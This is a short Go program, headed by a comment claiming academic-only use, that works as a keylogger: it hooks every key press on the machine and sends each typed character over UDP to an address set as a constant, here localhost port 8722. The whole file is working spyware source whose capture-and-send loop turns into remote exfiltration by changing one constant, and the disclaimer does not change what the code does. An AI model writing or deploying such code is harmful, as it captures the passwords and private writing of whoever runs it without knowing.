// STATEMENT:
// In consideration of all possible negative effects this software will bring,
// this software is developed only for academic usage.
// Any malicious usage of this software is forbidden and unrelated to the author.

package main

import (
	"fmt"
	hook "github.com/robotn/gohook"
	"net"
)

const (
	Protocol = "udp"
	Address  = "127.0.0.1:8722"
)

func main() {
	conn, err := net.Dial(Protocol, Address)
	if err != nil {
		return
	}
	defer conn.Close()

	evChan := hook.Start()
	defer hook.End()
	for ev := range evChan {
		if ev.Kind == hook.KeyDown {
			conn.Write([]byte(fmt.Sprintf("%c", ev.Keychar)))
		}
	}
}
